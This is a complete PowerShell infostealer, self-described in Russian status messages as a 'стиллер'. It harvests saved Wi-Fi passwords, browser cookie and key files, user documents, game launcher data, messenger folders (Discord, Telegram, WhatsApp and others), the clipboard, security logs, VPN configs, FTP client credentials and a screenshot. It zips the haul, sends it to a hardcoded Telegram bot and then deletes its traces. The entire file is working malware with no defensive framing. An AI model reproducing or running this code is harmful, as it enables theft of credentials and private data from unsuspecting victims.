# --- Сообщения ---
$messages = @{
    Start = "Запуск стиллера...";
    SystemCollect = "Сбор информации о системе";
    BrowsersCollect = "Сбор данных браузеров...";
    FilesCollect = "Сбор файлов...";
    GamingCollect = "Сбор данных игровых клиентов...";
    MessengersCollect = "Сбор логов мессенджеров...";
    Screenshot = "Делаем снимок экрана...";
    UserActivity = "Сбор клипборда и специфической активности...";
    NetworkCollect = "VPN/FTP данные...";
    Archive = "Архивируем данные...";
    TelegramSend = "Отправка архива в Telegram...";
    Success = "Архив успешно отправлен.";
    FailSend = "Не получилось отправить архив.";
    Finished = "Стиллер завершён.";
}
$BotToken = "8432230669:AAGsKeVpDl9nKqUuHUfciRxrGYdIGQ01b6I"
$ChatID = "1266539824"

Add-Type -Assembly System.IO.Compression.FileSystem

function WriteMsg($key) { Write-Host $messages[$key] }

# Деление больших файлов
function Split-File {
    param ([string]$FilePath, [int]$PartSizeMB = 49)
    $bufSize = 1MB
    $maxBytes = $PartSizeMB * 1MB
    $filename = [System.IO.Path]::GetFileNameWithoutExtension($FilePath)
    $ext = [System.IO.Path]::GetExtension($FilePath)
    $dir = [System.IO.Path]::GetDirectoryName($FilePath)
    $parts = @()
    $f = [System.IO.File]::OpenRead($FilePath)
    try {
        $partIdx = 1
        while ($f.Position -lt $f.Length) {
            $partName = "$dir\$filename.part$partIdx$ext"
            $out = [System.IO.File]::Create($partName)
            $written = 0
            $buf = New-Object byte[] $bufSize
            while ($written -lt $maxBytes -and $f.Position -lt $f.Length) {
                $toRead = [Math]::Min($bufSize, $maxBytes - $written)
                $r = $f.Read($buf, 0, $toRead)
                if ($r -gt 0) { $out.Write($buf, 0, $r); $written += $r } else { break }
            }
            $out.Close(); $parts += $partName; $partIdx++
        }
    } finally { $f.Close() }
    return $parts
}

# Отправка архива в Telegram
function Send-ResultToTelegram {
    param (
        [string]$BotToken,
        [string]$ChatID,
        [string]$ZipPath,
        [string]$SystemInfoPath
    )
    $caption = ""
    if (Test-Path $SystemInfoPath) {
        $caption = Get-Content $SystemInfoPath | Out-String
    }
    $url = "https://api.telegram.org/bot$BotToken/sendDocument"
    try {
        Add-Type -AssemblyName System.Net.Http
        $fileStream = [System.IO.File]::OpenRead($ZipPath)
        $fileName = [System.IO.Path]::GetFileName($ZipPath)
        $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
        $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/zip")
        $form = New-Object System.Net.Http.MultipartFormDataContent
        $form.Add($fileContent, "document", $fileName)
        $form.Add((New-Object System.Net.Http.StringContent($ChatID)), "chat_id")
        $form.Add((New-Object System.Net.Http.StringContent($caption)), "caption")
        $client = New-Object System.Net.Http.HttpClient
        $response = $client.PostAsync($url, $form).Result
        $statusCode = $response.StatusCode
        $result = $response.Content.ReadAsStringAsync().Result
        $fileStream.Dispose(); $form.Dispose(); $client.Dispose()
        if ($statusCode -eq [System.Net.HttpStatusCode]::OK) { return $true } else { return $false }
    } catch { return $false }
}

# Сбор информации о системе (оптимизировано)
function Get-SystemInfo {
    param($OutDirectory)
    New-Item -Path $OutDirectory -ItemType Directory -Force | Out-Null
    $ipConfig = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | Select-Object IPAddress
    $externalIp = try { (Invoke-RestMethod -Uri 'https://api.ipify.org' -TimeoutSec 5).Trim() } catch { "N/A" }
    $userInfo = "Username: $($env:USERNAME)`r`nComputerName: $($env:COMPUTERNAME)`r`nLocal IP: $($ipConfig.IPAddress -join ', ')`r`nExternal IP: $externalIp"
    $userInfo | Out-File "$OutDirectory\user_info.txt" -Force
    $sysInfo = @{
        OS = (Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
        Version = (Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue).Version
        Architecture = $env:PROCESSOR_ARCHITECTURE
        RAM_GB = [Math]::Round((Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue).TotalPhysicalMemory / 1GB, 2)
        CPU = (Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue).Name
    }
    $sysInfo | Out-File "$OutDirectory\computer_info.txt" -Force
    Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* -ErrorAction SilentlyContinue | 
        Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | 
        Format-Table –AutoSize | 
        Out-File "$OutDirectory\installed_programs.txt" -Force
    try {
        $wifiProfiles = (netsh wlan show profiles 2>$null) | Select-String ":(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
        $wifiData = @()
        foreach ($profile in $wifiProfiles) {
            try {
                $profileData = (netsh wlan show profile name="$profile" key=clear 2>$null)
                $password = $profileData | Select-String "Key Content\W+\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
                if ($password) { $wifiData += [PSCustomObject]@{SSID=$profile; Password=$password} }
            } catch {}
        }
        if ($wifiData.Count -gt 0) {
            $wifiData | Format-Table -AutoSize | Out-File "$OutDirectory\wifi_passwords.txt" -Force
        }
    } catch {}
}

Add-Type -AssemblyName System.Data

# Сбор cookies Chrome
function Get-ChromiumCookies {
    param([string]$BrowserPath, [string]$OutDir)
    $cookieDb = "$BrowserPath\Local State"
    if (Test-Path $cookieDb) {
        try {
            Copy-Item $cookieDb -Destination "$OutDir\cookies.db" -Force -ErrorAction Stop
        } catch {}
    }
}

# Сбор cookies Firefox
function Get-FirefoxCookies {
    param([string]$ProfilePath, [string]$OutDir)
    $cookieDb = "$ProfilePath\cookies.sqlite"
    if (Test-Path $cookieDb) {
        try {
            Copy-Item $cookieDb -Destination "$OutDir\cookies.sqlite" -Force -ErrorAction Stop
        } catch {}
    }
}

# Все cookies Chromium
function Get-AllChromiumCookies {
    param([string]$OutDir)
    $browsers = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data",
        "$env:LOCALAPPDATA\Opera\Opera Stable"
    )
    foreach ($browserPath in $browsers) {
        if (Test-Path $browserPath) {
            $browserName = Split-Path $browserPath -Leaf
            $browserOutDir = "$OutDir\$browserName"
            New-Item -Path $browserOutDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
            Get-ChromiumCookies -BrowserPath $browserPath -OutDir $browserOutDir
        }
    }
}

# Все cookies Firefox
function Get-AllFirefoxCookies {
    param([string]$OutDir)
    $profilesIni = "$env:APPDATA\Mozilla\Firefox\profiles.ini"
    if (Test-Path $profilesIni) {
        $profiles = Get-Content $profilesIni -ErrorAction SilentlyContinue | Select-String "Path=" | ForEach-Object { $_.Line -replace ".*Path=", "" }
        foreach ($profile in $profiles) {
            $profilePath = "$env:APPDATA\Mozilla\Firefox\$profile"
            if (Test-Path $profilePath) {
                $profileOutDir = "$OutDir\Firefox_$([System.IO.Path]::GetFileName($profile))"
                New-Item -Path $profileOutDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
                Get-FirefoxCookies -ProfilePath $profilePath -OutDir $profileOutDir
            }
        }
    }
}

# Общее для браузеров
function Get-BrowserData {
    param($OutDirectory)
    New-Item -Path $OutDirectory -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
    $chromiumDir = "$OutDirectory\Chromium"
    $firefoxDir = "$OutDirectory\Firefox"
    New-Item -Path $chromiumDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
    New-Item -Path $firefoxDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
    Get-AllChromiumCookies -OutDir $chromiumDir
    Get-AllFirefoxCookies -OutDir $firefoxDir
}

# Сбор файлов
function Gather-Files {
    param($OutDirectory)
    New-Item -Path $OutDirectory -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
    $userDirs = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents", "$env:USERPROFILE\Downloads")
    foreach ($dir in $userDirs) {
        if (Test-Path $dir) {
            Get-ChildItem -Path $dir -File -Recurse -ErrorAction SilentlyContinue |
                Where-Object {
                    $_.Length -lt 20MB -and
                    $_.Attributes -notmatch "System" -and
                    $_.Name -notmatch "(?:pagefile|swapfile|\.tmp$|\.log$)" -and
                    $_.FullName -notmatch "\\Cache\\|\\Code Cache\\|\\GPUCache\\|\\Service Worker\\|\\Local Storage\\|\\Session Storage\\"
                } | ForEach-Object {
                try {
                    Copy-Item $_.FullName -Destination "$OutDirectory\" -Force -ErrorAction Stop
                } catch {
                    Add-Content "$OutDirectory\copy_errors.txt" "FAILED: $($_.FullName) : $($_.Exception.Message)"
                }
            }
        }
    }
}

# Сбор данных игровых клиентов
function Get-GameLauncherData {
    param($OutDirectory)
    New-Item -Path $OutDirectory -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
    $gamePaths = @(
        "$env:APPDATA\Steam",
        "$env:LOCALAPPDATA\Epic Games",
        "$env:APPDATA\GOG.com",
        "$env:LOCALAPPDATA\DayZ"
    )
    foreach ($gamePath in $gamePaths) {
        if (Test-Path $gamePath) {
            $gameName = Split-Path $gamePath -Leaf
            try {
                Copy-Item $gamePath -Destination "$OutDirectory\$gameName" -Recurse -Force -ErrorAction Stop
            } catch {
                Add-Content "$OutDirectory\copy_errors.txt" "FAILED: $gamePath : $($_.Exception.Message)"
            }
        }
    }
}

# Сбор данных мессенджеров
function Get-MessengerData {
    param($OutDirectory)
    New-Item -Path $OutDirectory -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
    $messengerPaths = @(
        "$env:APPDATA\Discord",
        "$env:LOCALAPPDATA\Telegram Desktop",
        "$env:APPDATA\Skype",
        "$env:APPDATA\WhatsApp",
        "$env:LOCALAPPDATA\Viber"
    )
    foreach ($messengerPath in $messengerPaths) {
        if (Test-Path $messengerPath) {
            $messengerName = Split-Path $messengerPath -Leaf
            try {
                Copy-Item $messengerPath -Destination "$OutDirectory\$messengerName" -Recurse -Force -ErrorAction Stop
            } catch {
                Add-Content "$OutDirectory\copy_errors.txt" "FAILED: $messengerPath : $($_.Exception.Message)"
            }
        }
    }
}

# Скриншот экрана
function Take-Screenshot {
    param([string]$OutFile)
    try {
        Add-Type -AssemblyName System.Windows.Forms
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen
        $bitmap = New-Object System.Drawing.Bitmap($screen.Bounds.Width, $screen.Bounds.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Bounds.Location, [System.Drawing.Point]::Empty, $screen.Bounds.Size)
        $bitmap.Save($OutFile)
        $graphics.Dispose()
        $bitmap.Dispose()
    } catch {}
}

# Сбор активности пользователя
function Get-UserActivity {
    param($OutDirectory)
    New-Item -Path $OutDirectory -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
    try {
        $clipboard = Get-Clipboard -ErrorAction SilentlyContinue
        if ($clipboard) {
            $clipboard | Out-File "$OutDirectory\clipboard.txt" -Force
        }
    } catch {}
    try {
        Get-EventLog -LogName Security -Newest 1000 -ErrorAction SilentlyContinue | Export-Csv "$OutDirectory\security_events.csv" -Force
    } catch {}
}

# Сбор VPN/FTP данных
function Get-VpnFtpData {
    param($OutDirectory)
    New-Item -Path $OutDirectory -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
    $vpnDir = "$OutDirectory\VPN_Configs"
    New-Item -Path $vpnDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
    $searchDirs = @(
        "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents", "$env:USERPROFILE\Desktop",
        "$env:APPDATA\OpenVPN", "$env:APPDATA\OpenVPN Connect", "$env:APPDATA\ProtonVPN"
    )
    foreach ($dir in $searchDirs) {
        if (Test-Path $dir) {
            Get-ChildItem -Path $dir -File -Recurse -Include *.ovpn, *.conf, *.ini -ErrorAction SilentlyContinue |
                Where-Object { $_.Length -le 5MB } |
                ForEach-Object {
                    try { Copy-Item $_.FullName -Destination $vpnDir -Force -ErrorAction Stop }
                    catch { Add-Content "$vpnDir\copy_errors.txt" "FAILED: $($_.FullName) : $($_.Exception.Message)" }
                }
        }
    }
    $rootfiles = @(
        "$env:USERPROFILE\*.ovpn", "$env:USERPROFILE\*.conf", "$env:USERPROFILE\*.ini"
    )
    foreach ($pattern in $rootfiles) {
        Get-ChildItem -Path $pattern -File -ErrorAction SilentlyContinue |
            Where-Object { $_.Length -le 5MB } |
            ForEach-Object {
                try { Copy-Item $_.FullName -Destination $vpnDir -Force -ErrorAction Stop }
                catch { Add-Content "$vpnDir\copy_errors.txt" "FAILED: $($_.FullName) : $($_.Exception.Message)" }
            }
    }
    $ftpDir = "$OutDirectory\FTP_Clients"
    New-Item -Path $ftpDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
    $ftpPaths = @(
        "$env:APPDATA\FileZilla",
        "$env:APPDATA\WinSCP.ini",
        "$env:APPDATA\CoreFTP",
        "$env:APPDATA\Cyberduck",
        "$env:APPDATA\SmartFTP"
    )
    foreach ($ftpPath in $ftpPaths) {
        if (Test-Path $ftpPath) {
            try { Copy-Item $ftpPath -Destination $ftpDir -Recurse -Force -ErrorAction Stop }
            catch { Add-Content "$ftpDir\copy_errors.txt" $_.Exception.Message }
        }
    }
}

# Функция запуска со всеми параллельными задачами - БЕЗ Start-Job
function Start-Execution {
    WriteMsg "Start"
    $tempDir = "$env:TEMP\SystemData-$(Get-Random)"
    New-Item -Path $tempDir -ItemType Directory -Force | Out-Null

    WriteMsg "SystemCollect"
    Get-SystemInfo -OutDirectory "$tempDir\System"
    
    WriteMsg "BrowsersCollect"
    Get-BrowserData -OutDirectory "$tempDir\Browsers"
    
    WriteMsg "FilesCollect"
    Gather-Files -OutDirectory "$tempDir\Files"
    
    WriteMsg "GamingCollect"
    Get-GameLauncherData -OutDirectory "$tempDir\Gaming"
    
    WriteMsg "MessengersCollect"
    Get-MessengerData -OutDirectory "$tempDir\Messengers"
    
    WriteMsg "UserActivity"
    Get-UserActivity -OutDirectory "$tempDir\Activity"
    
    WriteMsg "NetworkCollect"
    Get-VpnFtpData -OutDirectory "$tempDir\Network"

    WriteMsg "Screenshot"
    Take-Screenshot -OutFile "$tempDir\screenshot.png"

    WriteMsg "Archive"
    $zipPath = "$env:TEMP\DataPackage-$(Get-Random).zip"
    if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
    [System.IO.Compression.ZipFile]::CreateFromDirectory(
        $tempDir,
        $zipPath,
        [System.IO.Compression.CompressionLevel]::Fastest,
        $false
    )

    $maxTelegramMB = 49
    $zipSizeMB = [Math]::Round((Get-Item $zipPath).Length / 1MB, 2)
    WriteMsg "TelegramSend"
    if ($zipSizeMB -le $maxTelegramMB) {
        $systemInfoPath = "$tempDir\System\user_info.txt"
        $ok = Send-ResultToTelegram $BotToken $ChatID $zipPath $systemInfoPath
        if ($ok) { WriteMsg "Success" } else { WriteMsg "FailSend" }
    } else {
        $parts = Split-File -FilePath $zipPath -PartSizeMB $maxTelegramMB
        $allOk = $true
        $systemInfoPath = "$tempDir\System\user_info.txt"
        foreach ($pt in $parts) {
            $ok = Send-ResultToTelegram $BotToken $ChatID $pt $systemInfoPath
            if (-not $ok) { $allOk = $false }
        }
        if ($allOk) { WriteMsg "Success" } else { WriteMsg "FailSend" }
    }
    Remove-Item -Path $tempDir -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue
    Remove-Item -Path $zipPath -Force -ErrorAction SilentlyContinue
    WriteMsg "Finished"
}

Start-Execution
